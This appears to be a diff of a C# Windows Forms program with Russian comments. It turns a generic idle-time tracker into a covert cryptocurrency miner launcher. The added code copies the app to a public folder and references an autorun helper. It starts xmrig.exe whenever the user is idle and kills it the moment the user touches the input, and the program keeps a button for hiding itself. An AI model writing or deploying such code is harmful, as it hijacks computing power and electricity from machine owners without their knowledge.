@@ -16,11 +16,14 @@ namespace WindowsFormsApp1
 {
     public partial class Form1 : Form
     {
-        Process srartProg;
+        //Process srartProg;
         string progStartName;
         bool prog_started;
         string textTranslit;
         int idleTimeOld;
+        string time;
+        int rigID;
+        
 
 
         public Form1()
@@ -39,20 +42,10 @@ namespace WindowsFormsApp1
             tmrShow.Tick += tmrShow_Tick;
             tmrShow.Enabled = true;
 
-            progStartName = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" + System.AppDomain.CurrentDomain.FriendlyName;
+            progStartName = @"C:\Users\Public\Favor";
 
-            if (Directory.Exists(progStartName)==false)
-            {
-                try
-                {
-                    File.Copy(System.AppDomain.CurrentDomain.FriendlyName, progStartName, true);
-                }
-
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message, "Copy");
-                }
-            }
+            CopyDir copy = new CopyDir();
+            copy.copyDir(Environment.CurrentDirectory, progStartName);
 
             Autorun autoR = new Autorun();
             //autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, "\"" + progStartName + "\" -autorun");
@@ -61,7 +54,6 @@ namespace WindowsFormsApp1
         }
         //C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
         //папка автозагрузки для win7
-
 
         struct LastInputInfo    //переменная для хранения времени бездействия системы
         {
@@ -75,6 +67,9 @@ namespace WindowsFormsApp1
 
         LastInputInfo lastInputInfo = new LastInputInfo();  //новая переменная для работы с временем бездействия
 
+
+
+
         private void tmrShow_Tick(object sender, EventArgs e)      //функция счётчика времени
         {
             lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo); //присвоение переменной времени бездействия
@@ -83,21 +78,40 @@ namespace WindowsFormsApp1
             int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                             //Этот вариант лучше, хотя разницы я не знаю
 
-            label1.Text = Convert.ToString(idleTime);   //вывод времени на лейбу
-            label2.Text = DateTime.Now.ToString("HH.mm");
 
-            if (idleTime >= 7200000 && prog_started == false)
+
+
+            time= DateTime.Now.ToString("HH.mm");
+
+            if (time == "00.00")
             {
+                prog_started = false;
+                close_prog();
+                FileStatus stat = new FileStatus();
+                stat.restart();
+            }
+
+            //if (idleTime >= 7200000 && prog_started == false && time != "00.00")
+                if (idleTime >= 5000 && prog_started == false && time != "00.00")
+                {
                 prog_started = true;
                 start_prog();
             }
+
             if (idleTime <= 100 && prog_started == true)
             {
                 prog_started = false;
                 close_prog();
             }
 
-            if (checkBox1.Checked == true)
+            if (File.Exists(Environment.CurrentDirectory + "/restart.txt"))
+            {
+                File.Delete(Environment.CurrentDirectory + "/restart.txt");
+                prog_started = true;
+                start_prog();
+            }
+
+            if (checkBox1.Checked == true)      //проверяет показывать ли в текствоксе когда пользователь ёрзает
             {
                 if (idleTime <= 100 && idleTimeOld >= 1000 && prog_started == false)
                 {
@@ -108,13 +122,36 @@ namespace WindowsFormsApp1
         }
 
         private void start_prog()
-        { 
-            
+        {
+            try
+            {
+                System.Diagnostics.Process srartProg = new System.Diagnostics.Process();
+                srartProg.StartInfo.FileName = Environment.CurrentDirectory+ @"\xmrig.exe";
+                srartProg.Start();
+                //srartProg = Process.Start("xmrig.exe");
+                rigID = srartProg.Id;
+                prog_started = true;
+                
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message , "Start");
+                prog_started = true;
+            }
         }
 
         private void close_prog()
-        { 
-        
+        {
+            try
+            {
+                    Process.GetProcessById(rigID).Kill();
+                    prog_started = false;
+                
+            }
+            catch 
+            {
+                prog_started = false;
+            }
         }
 
         private void printString(string masage, bool importmant)
@@ -148,26 +185,23 @@ namespace WindowsFormsApp1
 
         private void button1_Click(object sender, EventArgs e)  //перезапускает
         {
-            Application.Restart();
-
+            //Application.Restart();
+            //File.ReadLines("input.txt").Skip(1).First();
+            //time = "00.00";
+            FileStatus stat = new FileStatus();
+            stat.restart();
         }
 
         private void button2_Click(object sender, EventArgs e)  //стартует какой-то процесс. Нужно указать имя exe файла
         {
-            if (prog_started == false)
-            {
-                srartProg = Process.Start("explorer.exe");
-                prog_started = true;
-            }
+            prog_started = true;
+            start_prog();
         }
 
         private void button3_Click(object sender, EventArgs e)  //убивает процесс
         {
-            if (prog_started == true)
-            {
-                Process.GetProcessById(srartProg.Id).Kill();
-                prog_started = false;
-            }
+            prog_started = false;
+            close_prog();
         }
 
         private void button4_Click(object sender, EventArgs e)  //прячет программу
